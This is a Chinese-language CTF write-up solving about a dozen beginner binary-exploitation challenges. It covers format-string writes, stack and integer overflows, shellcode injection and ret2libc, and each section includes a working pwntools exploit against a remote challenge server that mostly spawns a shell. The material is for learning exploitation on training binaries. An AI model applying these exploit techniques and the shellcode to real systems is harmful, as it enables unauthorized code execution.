# Pwn Exercise Area

## 0x00 前言

因为pwn基础实在太次所以从头到尾刷了一边攻防世界上的新手练习题

wsl+pwntool+vscode 太舒适了 虽然64位wsl调32位的ELF很麻烦

收货：

- pwntool的基本使用方式和exp的基础写法
- 对函数调用时栈内的变化有了更深的了解，懂了一点点栈溢出的含义
- 对C格式化字符串有了更深的理解

Todo:

- gdb-peda 本地动态调试查看程序实时栈变化
- pwntool 本地调试和log的写法
- shellcode的编写

## 0x01 Getshell

真·运行就能拿到~~flag~~ shell

### Exp

```python
#coding=utf-8
from pwn import *
io=remote("111.198.29.45","30397")
io.interactive()
```

然后cat flag就完事了

## 0x02 CGfsb

最基础的printf格式化漏洞

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/

checksec 一下发现是32位的ELF 然后也没有开PIE

丢进ida pro,关键部分长这样

```cpp
  printf(&s);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
```

也就是说我们要修改pwnme的值为8

有没觉得这个printf很奇怪？

在不带参数的情况下，我们一般是这样写的

```cpp
printf(“xxxx”);
```

由此想要直接输出一个字符串s，写

```cpp
printf(&s);
```

也是没有问题的

但是，由于printf接受的第一个参数是可以带%进行格式化控制的。

如果这个时候我们在字符串里写入格式化控制，会printf出来啥呢

比如我们构造这样一个payload:

```python
payload="a"*4+'-%p'*10#%p表示用地址的格式打印变量的值
```

然后扔进写好的exp框架里

```python
#coding=utf-8
from pwn import *
payload="a"*4+'-%p'*20
io=remote("111.198.29.45","51832")
io.sendlineafter("please tell me your name:","eki")
io.sendlineafter("leave your message please:",payload)
io.interactive()
```

返回

```bash
hello eki
your message is:
aaaa-0xffedb8de-0xf77755a0-0xf0b5ff-0xffedb90e-0x1-0xc2-0x6b6548fb-0xa69-(nil)-0x61616161-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d
```

可以看到aaaa对应的"地址"（字符串的值）0x61616161在第十位出现了

所以我们可以把aaaa换成pwnme的地址，然后再利用

%n - 到目前为止所写的字符数

把8写入pwnme的地址(可在ida pro里找到)

就完成了修改pwnme的值的任务

### payload

```python
pwnme_addr=0x0804A068
payload=p32(pwnme_addr)+"%04c"+"%10$n"
#%04c用于输出4个空字符+p32地址的四位就符合8的要求了 %10$n 是为了将%n作用于第10个参数（除去第一个字符串参数）
```

## 0x03 when_did_you_born

checksec 一下发现是64位的elf 也没有PIE

逆向得到核心代码

```cpp
__isoc99_scanf("%d", &v5); 
if ( v5 == 1926 )
  {
    puts("You Cannot Born In 1926!");
    result = 0LL;
  }
  else
  {
    puts("What's Your Name?");
    gets(&v4);
    printf("You Are Born In %d\n", v5);
    if ( v5 == 1926 )
    {
      puts("You Shall Have Flag.");
      system("cat flag");
    }
```

也就是说我们在第一步不能让v5=1926

但是要让v5在第二步为1926

怎么办呢。

了解到

> gets从标准输入设备读字符串函数，其可以无限读取，不会判断上限，以回车结束读取，所以程序员应该确保buffer的空间足够大，以便在执行读操作时不发生溢出。

所以我们可以通过溢出的方式把本来应该在v4里的数据覆盖到v5上

通过ida我们可以看到

```cpp
  char v4; // [rsp+0h] [rbp-20h]
  unsigned int v5; // [rsp+8h] [rbp-18h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
```

也就是说v4和v5相差8位,可构造

### Payload

```python
payload="a"*8+p64(1926)
```

### Exp

```python
#coding=utf-8
from pwn import *
payload="a"*8+p64(1926)
io=remote("111.198.29.45","44355")
io.sendlineafter("What's Your Birth?","1234")
io.sendlineafter("What's Your Name?",payload)
io.interactive()
```

## 0x04 hello_pwn

和上一题类似

也是溢出覆盖

```cpp
  read(0, &unk_601068, 0x10uLL);
  if ( dword_60106C == 1853186401 )
    sub_400686();
```

>ssize_t read (int fd, void *buf, size_t count);
>
>read()是一个计算机编程语言函数，会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或无可读取的数据。错误返回-1,并将根据不同的错误原因适当的设置错误码。

在ida pro里看这两个的地址

```asm
.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o
.bss:0000000000601069                 db    ? ;
.bss:000000000060106A                 db    ? ;
.bss:000000000060106B                 db    ? ;
.bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r
```

差四个字节覆盖到dword_60106c，于是构造

### payload

```python
payload="a"*4+p64(1853186401)
```

### Exp

```python
#coding=utf-8
from pwn import *
payload="a"*4+p64(1853186401)

io=remote("111.198.29.45","46962")
io.recvuntil("lets get helloworld for bof")
io.send(payload)
io.interactive()
```

## 0x05 level0

checksec 一下 发现是amd64的程序 没有开RELRO，STACK和PIE

放进IDA pro里发现callsystem后门

又在vulnerable_function()里看到如下内容

```cpp
ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  return read(0, &buf, 0x200uLL);
}
```

0x200ull显然可以造成溢出覆盖，这里我们溢出到rbp(64位系统8字节)后修改调用函数的return值使之跳转到callsystem的函数地址，拿到后门

### Exp

```python
#coding=utf-8
from pwn import *

payload="a"*0x80+"a"*8+p64(0x400596)

dist=remote("111.198.29.45","31258")

dist.recvuntil("Hello, World")
dist.send(payload)
dist.interactive()
```

## 0x06 level2

还是惯例拿checksec 分析
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
拖进IDA pro

看到

```cpp
ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  system("echo Input:");
  return read(0, &buf, 0x100u);
}
```

和上题一样 存在栈溢出漏洞

但是这回没有现成的后门了

但是我们有system命令地址啊

然后在ida pro string 的窗口里又找到了

```
Address	Length	Type	String
.data:0804A024	00000008	C	/bin/sh
```

通过构造伪栈帧

我们可以执行命令system("/bin/sh")

### Payload:

```python
shell_addr = 0x0804A024
system_addr = 0x08048320

payload= "a"*(0x88+0x4)+p32(system_addr)+"a"*0x04+p32(shell_addr)
```
0x88用于覆盖缓冲区，0x04用于覆盖ebp地址的字符，接着覆写返回地址为system_addr(system的栈帧中的ebp地址)，0x04填充system函数的返回地址，p32(shell_addr)自然就是system的参数

### Exp:

```python
#coding=utf-8
from pwn import *

shell_addr = 0x0804A024
system_addr = 0x08048320

payload= "a"*(0x88+0x4)+p32(system_addr)+"a"*0x04+p32(shell_addr)

io=remote("111.198.29.45","35613")
io.sendlineafter("Input:\n",payload)
io.interactive()
```

## 0x07 string

checksec:

```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
拖进IDA里，发现有好多函数

> tips:可以在IDA pro内替换函数名使程序变得更清晰

分析函数，其中有

```cpp
  if ( *a1 == a1[1] )
  {
    puts("Wizard: I will help you! USE YOU SPELL");
    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    read(0, v1, 0x100uLL);
    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);//v1中的内容被当作一段函数执行
  }
```

也就是说我们可以在v1里塞一段shellcode，就可以getshell了

为了使程序进入该语句块，需要*a1==a1[0]

也即a[0]==a[1]

分析该函数发现a是子函数调用的参数

回到上上一级调用函数，在main()里

a是v3[0]的地址,v3[0]=68,v3[1]=85

所以我们要把v3[0]修改成85

再分析函数

我们发现

```cpp
  v4 = __readfsqword(0x28u);


  _isoc99_scanf("%d", &v1);
  if ( v1 == 1 )
  {
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    _isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    _isoc99_scanf("%s", &format);
    puts("Your wish is");
    printf(&format, &format);//溢出点
    puts("I hear it, I hear it....");
  }
```

根据之前解题的经验，显然我们可以在printf上做文章了

我们先看看format的偏移量

```python
payload="A"*8+"-p"*10
```

返回

```bash
Your wish is
AAAAAAAA-0x7f703600d6a3-0x7f703600e780-0x7f7035d3f2c0-0x7f7036235700-0x7f7036235700-0x100000022-0x19ed010-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70I hear it, I hear it....
```

偏移量为8位，

但是这回我们没有办法对v3的值直接注入了,因为他不在里函数的栈里，但是我们发现在一开始，程序已经将v4的值（即v3对应的地址告诉我们了）,而函数栈中v2的值又是可控的，所以我们可以通过向v2所代表的地址里注入值的方式实现pwn

又因为在函数中看到v2和format相差一位 （0x19ed010），所以我们构造

### Payload

```python
payload="%085d"+"%7$n"
```

### Exp

```python
#coding=utf-8
from pwn import *
payload="%85d"+"%7$n"
shellcode="\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
io=remote("111.198.29.45","52943")
io.recvuntil("secret[0] is ")
v3_addr=io.recvuntil("\n")
v3_address=eval("0x"+v3_addr[:-1])
io.sendlineafter("What should your character's name be:","eki")
io.sendlineafter("So, where you will go?east or up?:","east")
io.sendlineafter("go into there(1), or leave(0)?:","1")
io.sendlineafter("'Give me an address'",str(v3_address))
#io.sendlineafter("And, you wish is:",'A'*8+'-%p'*10)
io.sendlineafter("And, you wish is:",payload)
io.recvuntil("Wizard: I will help you! USE YOU SPELL")
io.send(shellcode)
io.interactive()
```

> 可以在shell-storm上找到对应架构和系统的shellcode 
>
> 也可使用pwntool自带的生成工具asm(shellcraft.sh())生成
>
> 需要指定 context(arch='amd64', os='linux')

注意v2本身是个以int存的地址所以不需要用p64进行地址转换

## 0x08 guess_num

Checksec:

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```
核心代码如下
```cpp
  gets(&v9);
  v4 = (const char *)seed[0];
  srand(seed[0]);
  for ( i = 0; i <= 9; ++i )
  {
    v8 = rand() % 6 + 1;
    printf("-------------Turn:%d-------------\n", (unsigned int)(i + 1));
    printf("Please input your guess number:");
    __isoc99_scanf("%d", &v6);
    puts("---------------------------------");
    if ( v6 != v8 )
    {
      puts("GG!");
      exit(1);
    }
    v4 = "Success!";
    puts("Success!");
  }
  sub_C3E(v4);
```

因为rand()本质是上是根据seed生成的一串伪随机数列

所以我们只要覆盖seed(0)为指定值就不难预言后面的数字了

显然gets是可以溢出的

v8和seed[0]在栈上

```cpp
  char v8; // [rsp+10h] [rbp-30h]
  unsigned int seed[2]; // [rsp+30h] [rbp-10h]
```

差0x20，所以构造

### Payload

```cpp
payload='a'*0x20+p64(123)
```

### Exp

```python
#coding=utf-8
from pwn import *
from ctypes import * #用来调用glibc，和源程序采用一致的rand函数
context(arch = 'amd64', os = 'linux')
payload='a'*0x20+p64(123)
io=remote("111.198.29.45","55317")
io.sendlineafter("Please let me know your name!",payload)
libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(123)
for i in range(10):
    io.sendlineafter("Please input your guess number:",str(libc.rand()%6+1))
io.interactive()
```

## 0x09 int_overflow

Checksec

```bash
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
拖进ida pro

看到一个很奇怪的函数

what_is_this()

```cpp
int what_is_this()
{
  return system("cat flag");
}
```

显然是个“后门”

再对函数进行分析

```cpp
char *__cdecl check_passwd(char *s)
{
  char *result; // eax
  char dest; // [esp+4h] [ebp-14h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Invalid Password");
    result = (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    result = strcpy(&dest, s);
  }
  return result;
}
```
> char \*strcpy(char\* dest, const char \*src);
> strcpy 把从src地址开始且含有NULL结束符的字符串复制到以dest开始的地址空间
> src和dest所指内存区域不可以重叠且dest必须有足够的空间来容纳src的字符串。

也就是说strcpy是不会检查目标地址有是否够用的空间，我们可以利用这个弱点进行栈溢出，修改result的值使之在return的时候构造what_is_this()的伪栈帧，返回flag值。

```python
sh_addr=0x0804868B
payload='a'*(0x14+0x4)+p32(sh_addr)
```

但是构造的长度显然不满足字符串长度的限制

但是注意到v3是int_8类型，最大能表示255,根据整数的存储原理，我们可以加一些字符让其溢出回到3到8之间

### Payload

```python
sh_addr=0x0804868B
payload='a'*(0x14+0x4)+p32(sh_addr)+'a'*(256-0x14-0x4-0x4+4)#int_8->256=1
```

### Exp

```python
#coding=utf-8
from pwn import *
context(arch = "amd64" ,os = 'linux')
sh_addr=0x0804868B
payload='a'*(0x14+0x4)+p32(sh_addr)+'a'*(256-0x14-0x4-0x4+4)
io=remote("111.198.29.45","45927")
io.sendlineafter("Your choice:","1")
io.sendlineafter("Please input your username:","eki")
io.sendafter("Please input your passwd:",payload)
io.interactive()
```

## 0x0A cgpwn2

checksec:

```bash
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
丢进IDA pro 分析

在hello()里

```cpp
char *hello()
{
  char *v0; // eax
  signed int v1; // ebx
  unsigned int v2; // ecx
  char *v3; // eax
  char s; // [esp+12h] [ebp-26h]
  int v6; // [esp+14h] [ebp-24h]
    /**/
  puts("please tell me your name");
  fgets(name, 50, stdin);
  puts("hello,you can leave some message here:");
  return gets(&s);//可构造栈溢出
}
```

和 level类似，我们可以构造一个system("/bin/sh")的伪栈帧

我们在IDA pro里找到了system的地址，但是这次没有"/bin/sh"了，怎么办

注意到name位于bss端（全局变量未初始化）

而且题目可以让我们去修改name

所以构造

Payload

```python
payload="a"*(0x26+0x04)+p32(system_addr)+"a"*4+p32(name_addr)
```

Exp

```python
#coding=utf-8
from pwn import *
io=remote("111.198.29.45","40904")
sh="/bin/sh"
name_addr=0x0804A080
system_addr=0x08048420
payload="a"*(0x26+0x04)+p32(system_addr)+"a"*4+p32(name_addr)
io.sendlineafter("please tell me your name",sh)
io.sendlineafter("hello,you can leave some message here:",payload)
io.interactive()
```

## 0x0B level3

checksec:

```bash
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
核心代码和level0一致

但是这一次我们在程序里没有system()的后门了。。。。。

怎么办呢

>程序对外部函数的调用需要在生成可执行文件时将外部函数链接到程序中，链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码，动态链接得到的可执行文件并不包含外部函数的代码，而是在运行时将动态链接库（若干外部函数的集合）加载到内存的某个位置，再在发生调用时去链接库定位所需的函数。
>
>手把手教你栈溢出从入门到放弃（下）----- https://zhuanlan.zhihu.com/p/25892385



注意到PIE没有开启，那么在libc中函数的offset就是固定的，所以我们如果找出了libc的base address，然后计算出system函数的offset得到system函数的真实地址，就可以pwn了。

我们先用write泄露write函数的实际地址

然后计算出偏移量

接下来只要计算出system和"/bin/sh"的实际地址就可以同level2一样getshell了

### Payload

```python
payload1 = 'a'*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) 
payload2 = 'a'*(0x88+0x4) +p32(system_addr) + 'a'*4 + p32(shell_addr)
```

### Exp

```python
#coding=utf-8
from pwn import *
elf = ELF("./level3")
libc = ELF("./libc_32.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.sym["main"]
write_libc = libc.sym["write"]
system_libc = libc.sym["system"]


payload1 = 'a'*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) #构造write栈帧泄露write_got地址 并重新回到main函数

io=remote("111.198.29.45","42198")
io.sendlineafter("Input:\n",payload1)
write_addr=u32(io.recv(4))

libc_base_addr = write_addr - write_libc #计算偏移量 得到基地址
system_addr = libc_base_addr + system_libc
shell_addr = libc_base_addr  + next(libc.search("/bin/sh"))

payload2 = 'a'*(0x88+0x4) +p32(system_addr) + 'a'*4 + p32(shell_addr)

io.sendlineafter("Input:\n",payload2)
io.interactive()
```